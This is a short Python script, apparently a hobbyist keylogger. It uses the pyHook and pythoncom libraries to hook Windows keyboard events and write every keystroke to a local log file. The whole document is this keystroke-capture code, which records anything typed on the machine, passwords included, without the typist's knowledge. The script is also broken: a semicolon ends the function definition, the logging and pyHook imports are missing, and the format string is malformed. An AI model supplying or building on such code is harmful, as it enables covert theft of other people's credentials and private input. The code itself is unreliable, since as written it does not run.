#will need to import files: pyhook, pythoncom

file_log = 'C:\\personal code\\simplelogger.py'

def OnKeyboardEvent (event);
    logging.basicConfig (filename=file_log, level=logging.DEBUG, format='% (message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()